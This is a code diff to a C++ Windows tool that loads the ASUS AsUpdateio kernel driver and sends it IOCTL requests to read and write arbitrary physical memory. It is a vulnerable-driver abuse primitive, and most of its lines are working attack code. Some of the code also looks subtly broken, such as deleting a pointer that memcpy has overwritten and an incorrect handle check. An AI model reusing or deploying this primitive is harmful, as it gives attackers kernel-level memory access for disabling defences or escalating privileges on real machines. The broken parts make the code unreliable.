@@ -7,13 +7,13 @@ NTSTATUS Driver::CreateDriver() {
     }
 
     SC_HANDLE hService = CreateService(hSCM,
-        ServiceName,
-        ServiceName,
+        _ServiceName,
+        _ServiceName,
         SERVICE_ALL_ACCESS,
         SERVICE_KERNEL_DRIVER,
         SERVICE_DEMAND_START,
         SERVICE_ERROR_NORMAL,
-        DriverLocation,
+        _DriverLocation,
         NULL,
         NULL,
         NULL,
@@ -25,7 +25,7 @@ NTSTATUS Driver::CreateDriver() {
         CloseServiceHandle(hSCM);
         return 0xDC000001;
     }
-    printf("[-] Created Driver: %s\n", ServiceName);
+    printf("[-] Created Driver: %s\n", _ServiceName);
     CloseServiceHandle(hService);
     CloseServiceHandle(hSCM);
     return 0;
@@ -37,7 +37,7 @@ NTSTATUS Driver::DeleteDriver() {
         return 0xDD000000;
     }
 
-    SC_HANDLE hService = OpenService(hSCM, ServiceName, SERVICE_ALL_ACCESS);
+    SC_HANDLE hService = OpenService(hSCM, _ServiceName, SERVICE_ALL_ACCESS);
 
     if (hService == NULL) {
         printf("[-] Failed to Open service\n");
@@ -45,12 +45,12 @@ NTSTATUS Driver::DeleteDriver() {
         return 0xDD000001;
     }
     if (!DeleteService(hService)) {
-        std::cout << "Failed to delete the driver service." << std::endl;
+        printf("[-] Failed to delete the driver service\n");
         CloseServiceHandle(hService);
         CloseServiceHandle(hSCM);
         return 0xDD000002;
     }
-    printf("[-] Deleted Driver: %s\n", ServiceName);
+    printf("[-] Deleted Driver: %s\n", _ServiceName);
 
     CloseServiceHandle(hService);
     CloseServiceHandle(hSCM);
@@ -67,7 +67,7 @@ NTSTATUS Driver::StartDriver() {
             return 0xBB100000;
         }
 
-        SC_HANDLE hService = OpenService(hSCM, ServiceName, SERVICE_ALL_ACCESS);
+        SC_HANDLE hService = OpenService(hSCM, _ServiceName, SERVICE_ALL_ACCESS);
 
         if (hService == NULL) {
             printf("[-] Failed to Open service\n");
@@ -76,24 +76,29 @@ NTSTATUS Driver::StartDriver() {
             return 0xBB100001;
         }
         if (!StartServiceA(hService, 0, NULL)) {
-            std::cout << "Failed to Start the driver service." << std::endl;
+            printf("[-] Failed to Start the driver service\n");
             CloseServiceHandle(hService);
             CloseServiceHandle(hSCM);
             DeleteDriver();
             return 0xBB100002;
         }
-        printf("[-] Started Driver: %s\n", ServiceName);
+        printf("[-] Started Driver: %s\n", _ServiceName);
 
         CloseServiceHandle(hService);
         CloseServiceHandle(hSCM);
-        DriverHandle = CreateFileA("\\\\.\\AsUpdateio", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-        printf("[-] DriverHandle: %x\n", DriverHandle);
+        _DriverHandle = CreateFileA("\\\\.\\AsUpdateio", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (!_DriverHandle) {
+            StopDriver();
+            printf("[-] Failed To Open Handle To Driver (%d)\n", GetLastError());
+            return 0xBB100003;
+        }
+        printf("[-] DriverHandle: %d\n", _DriverHandle);
         return 0;
     }
     return CreateStatus;
 }
 NTSTATUS Driver::StopDriver() {
-    CloseHandle(DriverHandle);
+    CloseHandle(_DriverHandle);
     SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
     if (hSCM == NULL) {
         printf("[-] Failed to open Service Control Manager\n");
@@ -101,7 +106,7 @@ NTSTATUS Driver::StopDriver() {
         return 0xBB100000;
     }
 
-    SC_HANDLE hService = OpenService(hSCM, ServiceName, SERVICE_ALL_ACCESS);
+    SC_HANDLE hService = OpenService(hSCM, _ServiceName, SERVICE_ALL_ACCESS);
     if (hService == NULL) {
         printf("[-] Failed to Open service\n");
         CloseServiceHandle(hSCM);
@@ -128,7 +133,7 @@ NTSTATUS Driver::StopDriver() {
             return 0xBB100003;
         }
     }
-    printf("[-] Stopped Driver: %s\n", ServiceName);
+    printf("[-] Stopped Driver: %s\n", _ServiceName);
     CloseServiceHandle(hService);
     CloseServiceHandle(hSCM);
     return DeleteDriver();
@@ -147,7 +152,7 @@ bool Driver::ReadPhysical(__int64 PhysicalAddr, void* Buffer, int size)
     D.PhysicalAddress = PhysicalAddr;
 
     __int64* BufferReturn = new __int64;
-    if (!DeviceIoControl(DriverHandle, 0xA040244C, &D, sizeof(D), BufferReturn, sizeof(BufferReturn), &bytesReturned, NULL)) {
+    if (!DeviceIoControl(_DriverHandle, 0xA040244C, &D, sizeof(D), BufferReturn, sizeof(BufferReturn), &bytesReturned, NULL)) {
         printf("[-] Failed to send IOCTL request %d\n", GetLastError());
         return false;
     }
@@ -157,16 +162,15 @@ bool Driver::ReadPhysical(__int64 PhysicalAddr, void* Buffer, int size)
     memcpy(&BufferReturn, BufferReturn, 4);
     memcpy(Buffer, (void*)BufferReturn, size);
     __int64* Data = BufferReturn;
-    if (!DeviceIoControl(DriverHandle, 0xA0402450, &Data, sizeof(Data), &Data, sizeof(Data), &bytesReturned, NULL)) {
+    if (!DeviceIoControl(_DriverHandle, 0xA0402450, &Data, sizeof(Data), &Data, sizeof(Data), &bytesReturned, NULL)) {
         printf("[-] Failed to send IOCTL request %d\n", GetLastError());
         return false;
     }
+    delete BufferReturn;
     return true;
 }
-bool Driver::WritePhysical(__int64 PhysicalAddr, void* Buffer, int size)
-{
-
-    DWORD bytesReturned;
+bool Driver::WritePhysical(__int64 PhysicalAddr, void* Buffer, int size) {
+    DWORD BytesReturned;
     ASUSCall D;
     D.AddressSpace = 0;
     D.InterFaceSize = 0;
@@ -175,7 +179,7 @@ bool Driver::WritePhysical(__int64 PhysicalAddr, void* Buffer, int size)
     D.PhysicalAddress = PhysicalAddr;
 
     __int64* BufferReturn = new __int64;
-    if (!DeviceIoControl(DriverHandle, 0xA040244C, &D, sizeof(D), BufferReturn, sizeof(BufferReturn), &bytesReturned, NULL)) {
+    if (!DeviceIoControl(_DriverHandle, 0xA040244C, &D, sizeof(D), BufferReturn, sizeof(BufferReturn), &BytesReturned, NULL)) {
         printf("[-] Failed to send IOCTL request %d\n", GetLastError());
         return false;
     }
@@ -185,10 +189,11 @@ bool Driver::WritePhysical(__int64 PhysicalAddr, void* Buffer, int size)
     memcpy(&BufferReturn, BufferReturn, 4);
     memcpy(BufferReturn, (void*)Buffer, size);
     __int64* Data = BufferReturn;
-    if (!DeviceIoControl(DriverHandle, 0xA0402450, &Data, sizeof(Data), &Data, sizeof(Data), &bytesReturned, NULL)) {
+    if (!DeviceIoControl(_DriverHandle, 0xA0402450, &Data, sizeof(Data), &Data, sizeof(Data), &BytesReturned, NULL)) {
         printf("[-] Failed to send IOCTL request %d\n", GetLastError());
         return false;
     }
+    delete BufferReturn;
     return true;
 
 }
